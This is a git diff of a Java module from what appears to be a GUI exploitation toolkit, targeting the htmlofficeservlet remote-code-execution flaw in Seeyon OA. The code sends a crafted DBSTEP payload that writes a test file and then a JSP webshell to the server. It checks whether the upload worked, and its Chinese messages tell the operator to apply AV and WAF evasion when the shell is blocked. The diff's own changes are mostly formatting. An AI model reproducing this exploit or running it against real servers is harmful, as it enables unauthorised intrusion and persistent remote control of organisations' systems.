@@ -1,7 +1,9 @@
 package exp.oa.seeyonoa;
 
 import core.Exploitlnterface;
+
 import java.util.HashMap;
+
 import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
@@ -19,7 +21,7 @@ public class seeyonoa_htmlofficeservlet implements Exploitlnterface {
         return shell(url, textArea);
     }
 
-    private Boolean att(String url,TextArea textArea){
+    private Boolean att(String url, TextArea textArea) {
         String payload = "DBSTEP V3.0     370             0               300             DBSTEP=OKMLlKlV\n" +
                 "OPTION=S3WYOSWLBSGr\r\n" +
                 "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n" +
@@ -34,28 +36,28 @@ public class seeyonoa_htmlofficeservlet implements Exploitlnterface {
                 shell.readFile(shell.Testpath);
 
         Response post = HttpTools.post(url + "/seeyon/htmlofficeservlet", payload, new HashMap<String, String>(), "utf-8");
-        if(post.getCode() == 200 && post.getText().contains(shell.test_payload)){
+        if (post.getCode() == 200 && post.getText().contains(shell.test_payload)) {
             Response response = HttpTools.get(url + "/seeyon/nishizhu.txt", new HashMap<String, String>(), "utf-8");
-            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
-                Platform.runLater(()->{
-                  textArea.appendText("\n 漏洞存在 测试文件写入成功\n " + url + "/seeyon/nishizhu.txt");
+            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
+                Platform.runLater(() -> {
+                    textArea.appendText("\n 漏洞存在 测试文件写入成功\n " + url + "/seeyon/nishizhu.txt");
                 });
                 return true;
-            }else {
-               Platform.runLater(()->{
-                  textArea.appendText("\n seeyonoa_htmlofficeservlet-RCE-漏洞不存在 (出现误报请联系作者)");
-               });
+            } else {
+                Platform.runLater(() -> {
+                    textArea.appendText("\n seeyonoa_htmlofficeservlet-RCE-漏洞不存在 (出现误报请联系作者)");
+                });
                 return false;
             }
-        }else {
-            Platform.runLater(()->{
-              textArea.appendText("\n seeyonoa_htmlofficeservlet-RCE-漏洞不存在 (出现误报请联系作者)");
+        } else {
+            Platform.runLater(() -> {
+                textArea.appendText("\n seeyonoa_htmlofficeservlet-RCE-漏洞不存在 (出现误报请联系作者)");
             });
             return false;
         }
     }
 
-    private Boolean shell(String url,TextArea textArea){
+    private Boolean shell(String url, TextArea textArea) {
         String payload = "DBSTEP V3.0     370             0               4000             DBSTEP=OKMLlKlV\n" +
                 "OPTION=S3WYOSWLBSGr\r\n" +
                 "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n" +
@@ -70,17 +72,23 @@ public class seeyonoa_htmlofficeservlet implements Exploitlnterface {
                 shell.readFile(shell.Jsppath);
 
         Response post = HttpTools.post(url + "/seeyon/htmlofficeservlet", payload, new HashMap<String, String>(), "utf-8");
-        if(post.getCode() == 200 && post.getText().contains(shell.test_payload)){
+        if (post.getCode() == 200 && post.getText().contains(shell.test_payload)) {
             Response response = HttpTools.get(url + "/seeyon/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
-            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
-                textArea.appendText("\n 漏洞存在 webshell文件写入成功\n " + url + "/seeyon/nishizhu.jsp");
+            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
+                Platform.runLater(() -> {
+                    textArea.appendText("\n 漏洞存在 webshell文件写入成功\n " + url + "/seeyon/nishizhu.jsp");
+                });
                 return true;
-            }else {
-                textArea.appendText("\n webshell被查杀！！请进行免杀！！！");
+            } else {
+                Platform.runLater(() -> {
+                    textArea.appendText("\n webshell被查杀！！请进行免杀！！！");
+                });
                 return false;
             }
-        }else {
-            textArea.appendText("\n waf拦截！！请进行免杀！！！");
+        } else {
+            Platform.runLater(() -> {
+                textArea.appendText("\n waf拦截！！请进行免杀！！！");
+            });
             return false;
         }
     }
